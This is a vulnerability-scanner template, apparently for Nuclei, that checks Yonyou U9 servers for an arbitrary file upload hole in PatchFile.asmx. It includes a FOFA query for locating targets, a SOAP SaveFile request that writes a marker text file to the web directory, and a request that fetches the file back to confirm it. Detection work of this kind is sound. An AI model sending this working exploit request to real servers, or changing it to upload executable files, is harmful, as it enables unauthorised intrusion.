id: yonyou-u9-PatchFile-fileupload
info:
  name: 用友 U9 PatchFile.asmx - fileupload
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8B-U9-PatchFile.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: body="logo-u9.png"
  tags: yonyou,fileupload,oa,u9

variables:
  filename: "{{to_lower(rand_base(10))}}"


http:
  - raw:
      - |
        POST /CS/Office/AutoUpdates/PatchFile.asmx HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64)
        Connection: close
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/SaveFile"
        Accept-Encoding: gzip, deflate

        <?xml version="1.0" encoding="utf-8"?>
         <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
           <SaveFile xmlns="http://tempuri.org/">
            <binData>{{base64("leadlife")}}</binData>
            <path>./</path>
            <fileName>{{filename}}.txt</fileName>
           </SaveFile>
          </soap:Body>
         </soap:Envelope>


      - |
        GET /CS/Office/AutoUpdates/{{filename}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36


    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(body,"leadlife")